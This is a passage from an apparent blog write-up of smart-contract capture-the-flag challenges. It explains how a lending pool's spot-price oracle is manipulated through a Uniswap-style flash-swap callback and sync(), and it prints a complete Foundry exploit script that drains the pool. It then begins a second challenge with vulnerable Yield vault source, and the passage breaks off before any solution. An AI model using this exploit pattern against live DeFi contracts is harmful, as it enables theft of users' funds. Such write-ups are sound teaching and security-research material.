</span><span>        balance0 = IERC20(_token0).balanceOf(address(this));
</span><span>        balance1 = IERC20(_token1).balanceOf(address(this));
</span><span>        }
</span><span>        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
</span><span>        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
</span><span>        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
</span><span>        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
</span><span>        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
</span><span>        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
</span><span>        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
</span><span>        }
</span><span>
</span><span>        _update(balance0, balance1, _reserve0, _reserve1);
</span><span>        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
</span><span>    }
</span><span>
</span><span>    // force balances to match reserves
</span><span>    function skim(address to) external {
</span><span>        address _token0 = token0; // gas savings
</span><span>        address _token1 = token1; // gas savings
</span><span>        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
</span><span>        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
</span><span>    }
</span><span>
</span><span>    // force reserves to match balances
</span><span>    function sync() external {
</span><span>        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-2><a aria-label="Anchor link for: solution-2" class=zola-anchor href=#solution-2>Solution</a></h2><p>A Defi protocol requires nothing else than except complete understanding about the protocol control flow. Lets observe what each contract in this protocol is doing.<ol><li><p><strong>Lending Contract</strong>:</p> <ul><li>Add collateral using <code>collateralToken</code><li>Borrow <code>borrowToken</code> against their collateral<li>Repay borrowed tokens<li><strong>Uses a Pair contract to determine exchange rates</strong></ul><li><p><strong>Pair Contract</strong> (UniswapV2-style):</p> <ul><li>Implements an automated market maker (AMM)<li>Manages liquidity between two tokens (token0 and token1)<li>Handles token swaps and price calculations<li>Maintains reserves and updates prices<li>Provides functions for adding/removing liquidity<li><strong>Used by the Lending contract to get exchange rates</strong></ul><li><p><strong>SafeMath Library</strong>:</p> <ul><li>Provides safe arithmetic operations<li>Prevents overflows/underflows in mathematical calculations<li>Used by the Pair contract for calculations</ul><li><p><strong>UQ112x112 Library</strong>:</p> <ul><li>Handles fixed-point number calculations<li>Used for price calculations in the Pair contract<li>Helps maintain precision in price calculations</ul><li><p><strong>IUniswapV2Callee Interface</strong>:</p> <ul><li>Defines the callback interface for flash swaps<li>Used when executing flash swaps in the Pair contract</ul></ol><p>The goal is to drain all <code>borrowToken</code> from the Lending contract. I always prefer to know the initial state of the protocol by querying all the information from the contracts deployed. The following is the state of the protocol when we initially received the challenge instance.<pre class=language-bash data-lang=bash style=color:#61676c;background-color:#fafafa><code class=language-bash data-lang=bash><span style=color:#f29718>Lending</span><span> :  0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6
</span><span style=color:#f29718>Pair</span><span> :  0xE86b07a57552655eEFe68894bD346c84da238B15
</span><span style=color:#f29718>token0</span><span> (or) </span><span style=color:#f29718>collateralToken</span><span>  :  0xCcb0B898D555656e582b8d17ba7b426330Abb9D8
</span><span style=color:#f29718>token1</span><span> (or) </span><span style=color:#f29718>borrowToken:</span><span>   0x7373EB31cBDd5428720a37d50E5ec64EfA891acc
</span><span style=color:#f29718>Pair</span><span> balance of collatoralToken :  500000000000000000000
</span><span style=color:#f29718>Pair</span><span> balance of borrowToken :  500000000000000000000
</span><span style=color:#f29718>Pair</span><span> reserve0 :  500000000000000000000
</span><span style=color:#f29718>Pair</span><span> reserve1 :  500000000000000000000
</span><span style=color:#f29718>Lending</span><span> balance of collatoralToken :  0
</span><span style=color:#f29718>Lending</span><span> balance of borrowToken :  5000000000000000000000
</span><span style=color:#f29718>Player</span><span> balance of collatoralToken :  0
</span><span style=color:#f29718>Player</span><span> balance of borrowToken :  0
</span><span style=color:#f29718>price</span><span> of borrowToken in terms of collatoralTokens :  1000000000000000000
</span><span style=color:#f29718>Player</span><span> :  0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6
</span></code></pre><p>As you can observe I got zero amount of both collatoral and borrow tokens, but Lending contract have the <code>5000e18</code> of borrow tokens and the Pair contract got the <code>500e18</code> amount of both the tokens.<p>Now for me, I don't have any <code>collatoralToken</code> to borrow the token from the Lending contract and drain them all. So, lets see how the <code>borrow()</code> function calcuates how much collatoral needed to borrow all those <code>5000e18</code> amount of borrow tokens.<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>function borrow(uint256 _amount) external {
</span><span>    uint256 needCollateral = _amount * getExchangeRate() / 1e18;
</span><span>    require(needCollateral <= usersCollateral[msg.sender], "You don't have enough collateral");
</span><span>    borrowToken.transfer(msg.sender, _amount);
</span><span>    usersUsedCollateral[msg.sender] += needCollateral;
</span><span>    usersCollateral[msg.sender] -= needCollateral;
</span><span>    usersBorrowed[msg.sender] += _amount;
</span><span>}
</span></code></pre><blockquote><p>The <code>needCollateral</code> is calculated from the <code>getExchangeRate()</code> and divided by the <code>1e18</code>. Can we make this numerator as lesser than <code>1e18</code> ? So that the division will rounded to zero and we don't need to pay any <code>collatoralToken</code>.</blockquote><p>Smart right?<p>Lets see how can we do this? We need to make <code>getExchangeRate()</code> return a very small number or even zero would be perfect!<pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>    // Lending
</span><span>    function getExchangeRate() public view returns (uint256) {
</span><span>        return pair.getSpotPrice();
</span><span>    }
</span><span>
</span><span>    //Pair
</span><span>    function getSpotPrice() external view returns (uint256) {
</span><span>        return Math.mulDiv(reserve1, 1e18, reserve0);
</span><span>    }
</span></code></pre><p>Now we can see that the price of the <code>collatoralToken</code> is dependent on the <code>reserve0</code> and <code>reserve1</code>. And we need to manipulate the <code>reserve0</code> to be a large number than <code>reserve1 * 1e18</code> so that the <code>getSpotPrice()</code> will return zero.<p>To do this, I found out that we can perform few swaps in the Pair contract which changes the values of <code>reserve0</code> and <code>reserve1</code>. But if we do the borrow from Lending after the <code>swap()</code> the again the price will be increase. So, we need to find a way to update the reserves during the swap and borrow the amount in the same transacation. If we can observe there is a callback happening to the caller in the <code>swap()</code> function.<blockquote><p>if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</blockquote><p>So, during this callback we can borrow from Lending contract but the reserves need a forceful update. To do this we can make use of the vulnerable <code>skim()</code> and <code>sync()</code> functions in the Pair contract.<blockquote><p>Why <code>skim()</code> and <code>sync()</code> are vulnerable? Cause there is no reentrancy lock on these.</blockquote><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>    // force balances to match reserves
</span><span>    function skim(address to) external {
</span><span>        address _token0 = token0; // gas savings
</span><span>        address _token1 = token1; // gas savings
</span><span>        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
</span><span>        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
</span><span>    }
</span><span>
</span><span>    // force reserves to match balances
</span><span>    function sync() external {
</span><span>        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
</span><span>    }
</span></code></pre><p>Thats how I manipulated the <code>borrowToken</code> price to borrowed all the tokens from Lending. Find the exploit below.<div class=note-container><button class=note-toggle><div class=note-icon><p>Lending.s.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^0.8.0;
</span><span>
</span><span>import "forge-std/Script.sol";
</span><span>import "forge-std/console.sol";
</span><span>
</span><span>import {Pair, Lending, ERC20} from "../src/Lending.sol";
</span><span>
</span><span>contract LendingSolve is Script {
</span><span>    Lending public lending = Lending(0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6);
</span><span>    Pair public pair = lending.pair();
</span><span>    ERC20 public collateralToken = lending.collateralToken();
</span><span>    ERC20 public borrowToken = lending.borrowToken();
</span><span>    address player = vm.envAddress("PLAYER");
</span><span>
</span><span>    function run() external{
</span><span>        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
</span><span>        console.log("Lending : ", address(lending));
</span><span>        console.log("Pair : ", address(pair));
</span><span>        console.log("token0 (or) collateralToken  : ", pair.token0());
</span><span>        console.log("token1 (or) borrowToken:  ", pair.token1());
</span><span>        
</span><span>        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
</span><span>        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));
</span><span>        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = pair.getReserves();
</span><span>        console.log("Pair reserve0 : ", _reserve0);
</span><span>        console.log("Pair reserve1 : ", _reserve1);
</span><span>
</span><span>        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
</span><span>        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));
</span><span>
</span><span>        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
</span><span>        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));
</span><span>
</span><span>        console.log("price of borrowToken in terms of collatoralTokens : ", lending.getExchangeRate());
</span><span>        console.log("Player : ", player);
</span><span>        console.log("Player balance: ", player.balance);
</span><span>
</span><span>        Attack attack = new Attack(address(lending), player);
</span><span>        attack.exploit();
</span><span>
</span><span>        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
</span><span>        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));
</span><span>
</span><span>        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
</span><span>        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));
</span><span>
</span><span>        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
</span><span>        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));
</span><span>        console.log("isSolved() : ", lending.isSolved());
</span><span>        vm.stopBroadcast();
</span><span>    }
</span><span>}
</span><span>
</span><span>interface IUniswapV2Callee {
</span><span>    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
</span><span>}
</span><span>
</span><span>contract Attack is IUniswapV2Callee {
</span><span>    Lending public lending;
</span><span>    Pair public pair;
</span><span>    ERC20 public collateralToken;
</span><span>    ERC20 public borrowToken;
</span><span>    address player;
</span><span>
</span><span>    constructor(address _lending, address _player) {
</span><span>        lending = Lending(_lending);
</span><span>        pair =  lending.pair();
</span><span>        collateralToken = lending.collateralToken();
</span><span>        borrowToken = lending.borrowToken();
</span><span>        player = _player;
</span><span>    }
</span><span>    function exploit() public {
</span><span>        uint256 totalBorrowableBorrowTokenFromPair = borrowToken.balanceOf(address(pair)) - 1;
</span><span>        pair.swap(0, totalBorrowableBorrowTokenFromPair, address(this), abi.encodePacked("something"));
</span><span>    }
</span><span>    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
</span><span>        uint256 totalBorrowableBorrowTokenFromLending = borrowToken.balanceOf(address(lending));
</span><span>        pair.sync();
</span><span>        lending.borrow(totalBorrowableBorrowTokenFromLending);
</span><span>        uint256 borrowedTokensFromLending = borrowToken.balanceOf(address(address(this)));
</span><span>        borrowToken.transfer(address(pair), borrowedTokensFromLending);
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=yeild><a aria-label="Anchor link for: yeild" class=zola-anchor href=#yeild>Yeild</a></h1><p>P: "UniswapV3 yield farming is so easy! Just make sure there is liquidity around the spot price. You are given 5e18 each of token0 and token1. Your goal is to get 15e18 of LP tokens."<div class=note-container><button class=note-toggle><div class=note-icon><p>Yield.sol</div></button><div class=note-content style=display:block><pre class=language-solidity data-lang=solidity style=color:#61676c;background-color:#fafafa><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: Unlicense
</span><span>
</span><span>pragma solidity ^0.7.0;
</span><span>
</span><span>import "@openzeppelin-contracts-3.4.2/contracts/math/Math.sol";
</span><span>import "@uniswap/v3-core/contracts/libraries/FullMath.sol";
</span><span>import "@openzeppelin-contracts-3.4.2/contracts/utils/ReentrancyGuard.sol";
</span><span>import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3MintCallback.sol";
</span><span>import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
</span><span>import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
</span><span>import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
</span><span>import "@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol";
</span><span>import "@uniswap/v3-periphery/contracts/libraries/PositionKey.sol";
</span><span>import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/ERC20.sol";
</span><span>
</span><span>contract Yield is
</span><span>    IUniswapV3MintCallback,
</span><span>    IUniswapV3SwapCallback,
</span><span>    ERC20,
</span><span>    ReentrancyGuard
</span><span>{
</span><span>    event Deposit(
</span><span>        address indexed sender,
</span><span>        address indexed to,
</span><span>        uint256 shares,
</span><span>        uint256 amount0,
</span><span>        uint256 amount1
</span><span>    );
</span><span>
</span><span>    event Withdraw(
</span><span>        address indexed sender,
</span><span>        address indexed to,
</span><span>        uint256 shares,
</span><span>        uint256 amount0,
</span><span>        uint256 amount1
</span><span>    );
</span><span>
</span><span>    event CollectFees(
</span><span>        uint256 feesToVault0,
</span><span>        uint256 feesToVault1,
</span><span>        uint256 feesToProtocol0,
</span><span>        uint256 feesToProtocol1
</span><span>    );
</span><span>
</span><span>    event Snapshot(int24 tick, uint256 totalAmount0, uint256 totalAmount1, uint256 totalSupply);
</span><span>
</span><span>    IUniswapV3Pool public immutable pool;
</span><span>    IERC20 public immutable token0;
</span><span>    IERC20 public immutable token1;
</span><span>    int24 public immutable tickSpacing;
</span><span>
</span><span>    uint256 public protocolFee;
</span><span>    uint256 public maxTotalSupply;
</span><span>    address public governance;
</span><span>    address public pendingGovernance;
</span><span>
</span><span>    int24 public lastTick;
</span><span>    int24 public baseLower;
</span><span>    int24 public baseUpper;
</span><span>    uint256 public accruedProtocolFees0;
</span><span>    uint256 public accruedProtocolFees1;
</span><span>
</span><span>    address public player;
</span><span>
</span><span>    constructor(
</span><span>        address _player,
</span><span>        address _pool,
</span><span>        uint256 _protocolFee,
</span><span>        uint256 _maxTotalSupply
</span><span>    ) ERC20("Yield Vault", "YV") {
</span><span>        player = _player;
</span><span>        pool = IUniswapV3Pool(_pool);
</span><span>        token0 = ERC20(IUniswapV3Pool(_pool).token0());
</span><span>        token1 = ERC20(IUniswapV3Pool(_pool).token1());
</span><span>        tickSpacing = IUniswapV3Pool(_pool).tickSpacing();
</span><span>
</span><span>        protocolFee = _protocolFee;
</span><span>        maxTotalSupply = _maxTotalSupply;
</span><span>        governance = msg.sender;
</span><span>        lastTick = type(int24).max;
</span><span>
</span><span>        require(_protocolFee < 1e6, "protocolFee");
</span><span>    }
</span><span>
</span><span>    function isSolved() external view returns (bool) {
</span><span>        return balanceOf(player) >= 15 ether;
</span><span>    }
</span><span>
</span><span>    function deposit(
</span><span>        uint256 amount0Desired,
</span><span>        uint256 amount1Desired,
</span><span>        uint256 amount0Min,
</span><span>        uint256 amount1Min,
</span><span>        address to
</span><span>    )
</span><span>        external
</span><span>        nonReentrant
</span><span>        returns (
</span><span>            uint256 shares,
</span><span>            uint256 amount0,
</span><span>            uint256 amount1
</span><span>        )
</span><span>    {
</span><span>        require(amount0Desired > 0 || amount1Desired > 0, "amount0Desired or amount1Desired");
</span><span>        require(to != address(0) && to != address(this), "to");
</span><span>
</span><span>        // Poke positions so vault's current holdings are up-to-date
</span><span>        _poke(baseLower, baseUpper);
</span><span>
</span><span>        // Calculate amounts proportional to vault's holdings
</span><span>        (shares, amount0, amount1) = _calcSharesAndAmounts(amount0Desired, amount1Desired);
</span><span>        require(shares > 0, "shares");
</span><span>        require(amount0 >= amount0Min, "amount0Min");
</span><span>        require(amount1 >= amount1Min, "amount1Min");
</span><span>
</span><span>        // Pull in tokens from sender
</span><span>        if (amount0 > 0) token0.transferFrom(msg.sender, address(this), amount0);
</span><span>        if (amount1 > 0) token1.transferFrom(msg.sender, address(this), amount1);
</span><span>
</span><span>        // Mint shares to recipient
</span><span>        _mint(to, shares);
</span><span>        emit Deposit(msg.sender, to, shares, amount0, amount1);
</span><span>        require(totalSupply() <= maxTotalSupply, "maxTotalSupply");
</span><span>    }
</span><span>
</span><span>    function _poke(int24 tickLower, int24 tickUpper) internal {
</span><span>        (uint128 liquidity, , , , ) = _position(tickLower, tickUpper);
</span><span>        if (liquidity > 0) {
</span><span>            pool.burn(tickLower, tickUpper, 0);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function _calcSharesAndAmounts(uint256 amount0Desired, uint256 amount1Desired)
</span><span>        internal
</span><span>        view
</span><span>        returns (
</span><span>            uint256 shares,
</span><span>            uint256 amount0,
</span><span>            uint256 amount1
</span><span>        )
</span><span>    {
</span><span>        (uint256 total0, uint256 total1) = getTotalAmounts();
</span><span>        
</span><span>        // If total supply > 0, vault can't be empty
</span><span>        assert(totalSupply() == 0 || total0 > 0 || total1 > 0);
</span><span>
</span><span>        if (totalSupply() == 0) {
</span><span>            // For first deposit, just use the amounts desired
</span><span>            amount0 = amount0Desired;
</span><span>            amount1 = amount1Desired;
</span><span>            shares = Math.max(amount0, amount1);
</span><span>        } else if (total0 == 0) {
</span><span>            amount1 = amount1Desired;
</span><span>            shares = FullMath.mulDiv(amount1, totalSupply(), total1);
</span><span>        } else if (total1 == 0) {
</span><span>            amount0 = amount0Desired;
</span><span>            shares = FullMath.mulDiv(amount0, totalSupply(), total0);
</span><span>        } else {
</span><span>            uint256 cross = Math.min(amount0Desired * total1, amount1Desired * total0);
</span><span>            require(cross > 0, "cross");
</span><span>
</span><span>            // Round up amounts
</span><span>            amount0 = (cross - 1) / total1 + 1;
</span><span>            amount1 = (cross - 1) / total0 + 1;
</span><span>            shares = cross * totalSupply() / total0 / total1;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function withdraw(
</span><span>        uint256 shares,
</span><span>        uint256 amount0Min,
</span><span>        uint256 amount1Min,
</span><span>        address to
</span><span>    ) external nonReentrant returns (uint256 amount0, uint256 amount1) {
</span><span>        require(shares > 0, "shares");
</span><span>        require(to != address(0) && to != address(this), "to");
</span><span>
</span><span>        // Burn shares
</span><span>        _burn(msg.sender, shares);
</span><span>
</span><span>        // Calculate token amounts proportional to unused balances
</span><span>        uint256 unusedAmount0 = FullMath.mulDiv(getBalance0(), shares, totalSupply());
</span><span>        uint256 unusedAmount1 = FullMath.mulDiv(getBalance1(), shares, totalSupply());
</span><span>
</span><span>        // Withdraw proportion of liquidity from Uniswap pool
</span><span>        (uint256 baseAmount0, uint256 baseAmount1) =
</span><span>            _burnLiquidityShare(baseLower, baseUpper, shares, totalSupply());
</span><span>
</span><span>        // Sum up total amounts owed to recipient
</span><span>        amount0 = unusedAmount0 + baseAmount0;
</span><span>        amount1 = unusedAmount1 + baseAmount1;
</span><span>        require(amount0 >= amount0Min, "amount0Min");
</span><span>        require(amount1 >= amount1Min, "amount1Min");
</span><span>
</span><span>        // Push tokens to recipient
</span><span>        if (amount0 > 0) token0.transfer(to, amount0);
</span><span>        if (amount1 > 0) token1.transfer(to, amount1);
</span><span>
</span><span>        emit Withdraw(msg.sender, to, shares, amount0, amount1);
</span><span>    }
</span><span>
</span><span>    function _burnLiquidityShare(
</span><span>        int24 tickLower,
</span><span>        int24 tickUpper,
</span><span>        uint256 shares,
</span><span>        uint256 _totalSupply
</span><span>    ) internal returns (uint256 amount0, uint256 amount1) {
</span><span>        (uint128 totalLiquidity, , , , ) = _position(tickLower, tickUpper);
</span><span>        uint256 liquidity = FullMath.mulDiv(uint256(totalLiquidity), shares, _totalSupply);
</span><span>
</span><span>        if (liquidity > 0) {
</span><span>            (uint256 burned0, uint256 burned1, uint256 fees0, uint256 fees1) =
</span><span>                _burnAndCollect(tickLower, tickUpper, _toUint128(liquidity));
</span><span>
</span><span>            // Add share of fees
</span><span>            amount0 = burned0 + FullMath.mulDiv(fees0, shares, _totalSupply);
</span><span>            amount1 = burned1 + FullMath.mulDiv(fees1, shares, _totalSupply);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function rebalance() external nonReentrant {
</span><span>        (, int24 tick, , , , , ) = pool.slot0();
</span><span>        int24 diff = tick > lastTick ? tick - lastTick : lastTick - tick;
</span><span>        require(diff >= 5 * tickSpacing, "price diff");
</span><span>
</span><span>        int24 _baseLower = (tick - int24(10) * tickSpacing) / tickSpacing * tickSpacing > TickMath.MIN_TICK 
</span><span>            ? (tick - int24(10) * tickSpacing) / tickSpacing * tickSpacing : TickMath.MIN_TICK;
</span><span>        int24 _baseUpper = (tick + int24(10) * tickSpacing) / tickSpacing * tickSpacing < TickMath.MAX_TICK 
</span><span>            ? (tick + int24(10) * tickSpacing) / tickSpacing * tickSpacing : TickMath.MAX_TICK;
</span><span>
</span><span>        // Withdraw all current liquidity from Uniswap pool
</span><span>        {
</span><span>            (uint128 baseLiquidity, , , , ) = _position(baseLower, baseUpper);
</span><span>            _burnAndCollect(baseLower, baseUpper, baseLiquidity);
</span><span>        }
</span><span>
</span><span>        // Emit snapshot to record balances and supply
</span><span>        uint256 balance0 = getBalance0();
</span><span>        uint256 balance1 = getBalance1();
</span><span>        emit Snapshot(tick, balance0, balance1, totalSupply());
</span><span>
</span><span>        // Place base order on Uniswap
</span><span>        uint128 liquidity = _liquidityForAmounts(_baseLower, _baseUpper, balance0, balance1);
</span><span>        _mintLiquidity(_baseLower, _baseUpper, liquidity);
</span><span>        lastTick = tick;
</span><span>        (baseLower, baseUpper) = (_baseLower, _baseUpper);
</span><span>    }
</span><span>
</span><span>    function _burnAndCollect(
</span><span>        int24 tickLower,
</span><span>        int24 tickUpper,
</span><span>        uint128 liquidity
</span><span>    )
</span><span>        internal
</span><span>        returns (
</span><span>            uint256 burned0,
</span><span>            uint256 burned1,
</span><span>            uint256 feesToVault0,
</span><span>            uint256 feesToVault1
</span><span>        )
</span><span>    {
</span><span>        if (liquidity > 0) {
</span><span>            (burned0, burned1) = pool.burn(tickLower, tickUpper, liquidity);
</span><span>        }
</span><span>
</span><span>        // Collect all owed tokens including earned fees
</span><span>        (uint256 collect0, uint256 collect1) =
</span><span>            pool.collect(
</span><span>                address(this),
</span><span>                tickLower,
</span><span>                tickUpper,
</span><span>                type(uint128).max,
</span><span>                type(uint128).max
</span><span>            );
</span><span>
</span><span>        feesToVault0 = collect0 - burned0;
</span><span>        feesToVault1 = collect1 - burned1;
</span><span>        uint256 feesToProtocol0;
</span><span>        uint256 feesToProtocol1;
</span><span>
</span><span>        // Update accrued protocol fees
</span><span>        uint256 _protocolFee = protocolFee;
</span><span>        if (_protocolFee > 0) {
</span><span>            feesToProtocol0 = FullMath.mulDiv(feesToVault0, _protocolFee, 1e6);
</span><span>            feesToProtocol1 = FullMath.mulDiv(feesToVault1, _protocolFee, 1e6);
</span><span>            feesToVault0 = feesToVault0 - feesToProtocol0;
</span><span>            feesToVault1 = feesToVault1 - feesToProtocol1;
</span><span>            accruedProtocolFees0 = accruedProtocolFees0 + feesToProtocol0;
</span><span>            accruedProtocolFees1 = accruedProtocolFees1 + feesToProtocol1;
</span><span>        }
</span><span>        emit CollectFees(feesToVault0, feesToVault1, feesToProtocol0, feesToProtocol1);
</span><span>    }
</span><span>
</span><span>    function _mintLiquidity(
</span><span>        int24 tickLower,
</span><span>        int24 tickUpper,
</span><span>        uint128 liquidity
</span><span>    ) internal {
</span><span>        if (liquidity > 0) {
</span><span>            pool.mint(address(this), tickLower, tickUpper, liquidity, "");
</span><span>        }
</span><span>    }
</span><span>
</span><span>    function getTotalAmounts() public view returns (uint256 total0, uint256 total1) {
</span><span>        (uint256 baseAmount0, uint256 baseAmount1) = getPositionAmounts(baseLower, baseUpper);
</span><span>        total0 = getBalance0() + baseAmount0;
</span><span>        total1 = getBalance1() + baseAmount1;
</span><span>    }
</span><span>
</span><span>    function getPositionAmounts(int24 tickLower, int24 tickUpper)
</span><span>        public
</span><span>        view
</span><span>        returns (uint256 amount0, uint256 amount1)
</span><span>    {
</span><span>        (uint128 liquidity, , , uint128 tokensOwed0, uint128 tokensOwed1) =
</span><span>            _position(tickLower, tickUpper);
</span><span>        (amount0, amount1) = _amountsForLiquidity(tickLower, tickUpper, liquidity);
</span><span>
</span><span>        // Subtract protocol fees
</span><span>        uint256 oneMinusFee = uint256(1e6) - protocolFee;
</span><span>        amount0 = amount0 + (uint256(tokensOwed0) * oneMinusFee / 1e6);
</span><span>        amount1 = amount1 + (uint256(tokensOwed1) * oneMinusFee / 1e6);
</span><span>    }
</span><span>
</span><span>    function getBalance0() public view returns (uint256) {
</span><span>        return token0.balanceOf(address(this)) - accruedProtocolFees0;
</span><span>    }
</span><span>
</span><span>    function getBalance1() public view returns (uint256) {
</span><span>        return token1.balanceOf(address(this)) - accruedProtocolFees1;
</span><span>    }
</span><span>
</span><span>    function _position(int24 tickLower, int24 tickUpper)
</span><span>        internal
</span><span>        view
</span><span>        returns (
</span><span>            uint128,
</span><span>            uint256,
</span><span>            uint256,
</span><span>            uint128,
</span><span>            uint128
</span><span>        )
</span><span>    {
</span><span>        bytes32 positionKey = PositionKey.compute(address(this), tickLower, tickUpper);
</span><span>        return pool.positions(positionKey);
</span><span>    }
</span><span>
</span><span>    function _amountsForLiquidity(
</span><span>        int24 tickLower,
</span><span>        int24 tickUpper,
</span><span>        uint128 liquidity
</span><span>    ) internal view returns (uint256, uint256) {
</span><span>        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
</span><span>        return
</span><span>            LiquidityAmounts.getAmountsForLiquidity(
</span><span>                sqrtRatioX96,
</span><span>                TickMath.getSqrtRatioAtTick(tickLower),
</span><span>                TickMath.getSqrtRatioAtTick(tickUpper),
</span><span>                liquidity
</span><span>            );
</span><span>    }
</span><span>
</span><span>    function _liquidityForAmounts(
</span><span>        int24 tickLower,
</span><span>        int24 tickUpper,
</span><span>        uint256 amount0,
</span><span>        uint256 amount1
</span><span>    ) internal view returns (uint128) {
</span><span>        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
</span><span>        return
</span><span>            LiquidityAmounts.getLiquidityForAmounts(
</span><span>                sqrtRatioX96,
</span><span>                TickMath.getSqrtRatioAtTick(tickLower),
</span><span>                TickMath.getSqrtRatioAtTick(tickUpper),
</span><span>                amount0,
</span><span>                amount1
</span><span>            );
</span><span>    }
</span><span>
</span><span>    function _toUint128(uint256 x) internal pure returns (uint128) {
</span><span>        assert(x <= type(uint128).max);
</span><span>        return uint128(x);
</span><span>    }
</span><span>
</span><span>    function uniswapV3MintCallback(
</span><span>        uint256 amount0,
</span><span>        uint256 amount1,
</span><span>        bytes calldata data
</span><span>    ) external override {
</span><span>        require(msg.sender == address(pool));
</span><span>        if (amount0 > 0) token0.transfer(msg.sender, amount0);
</span><span>        if (amount1 > 0) token1.transfer(msg.sender, amount1);
</span><span>    }
</span><span>
</span><span>    function uniswapV3SwapCallback(
</span><span>        int256 amount0Delta,
</span><span>        int256 amount1Delta,
</span><span>        bytes calldata data
</span><span>    ) external override {
</span><span>        require(msg.sender == address(pool));
</span><span>        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
</span><span>        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
</span><span>    }
</span><span>
</span><span>    function collectProtocol(
</span><span>        uint256 amount0,
</span><span>        uint256 amount1,
</span><span>        address to
</span><span>    ) external onlyGovernance {
</span><span>        accruedProtocolFees0 = accruedProtocolFees0 - amount0;
</span><span>        accruedProtocolFees1 = accruedProtocolFees1 - amount1;
</span><span>        if (amount0 > 0) token0.transfer(to, amount0);
</span><span>        if (amount1 > 0) token1.transfer(to, amount1);
</span><span>    }
</span><span>
</span><span>    function sweep(
</span><span>        IERC20 token,
</span><span>        uint256 amount,
</span><span>        address to
</span><span>    ) external onlyGovernance {
</span><span>        require(token != token0 && token != token1, "token");
</span><span>        token.transfer(to, amount);
</span><span>    }
</span><span>
</span><span>    function setProtocolFee(uint256 _protocolFee) external onlyGovernance {
</span><span>        require(_protocolFee < 1e6, "protocolFee");
</span><span>        protocolFee = _protocolFee;
</span><span>    }
</span><span>
</span><span>    function setMaxTotalSupply(uint256 _maxTotalSupply) external onlyGovernance {
</span><span>        maxTotalSupply = _maxTotalSupply;
</span><span>    }
</span><span>
</span><span>    function emergencyBurn(
</span><span>        int24 tickLower,
</span><span>        int24 tickUpper,
</span><span>        uint128 liquidity
</span><span>    ) external onlyGovernance {
</span><span>        pool.burn(tickLower, tickUpper, liquidity);
</span><span>        pool.collect(address(this), tickLower, tickUpper, type(uint128).max, type(uint128).max);
</span><span>    }
</span><span>
</span><span>    function setGovernance(address _governance) external onlyGovernance {
</span><span>        pendingGovernance = _governance;
</span><span>    }
</span><span>
</span><span>    function acceptGovernance() external {
</span><span>        require(msg.sender == pendingGovernance, "pendingGovernance");
</span><span>        governance = msg.sender;
</span><span>    }
</span><span>
</span><span>    modifier onlyGovernance {
</span><span>        require(msg.sender == governance, "governance");
</span><span>        _;
</span><span>    }
</span><span>}
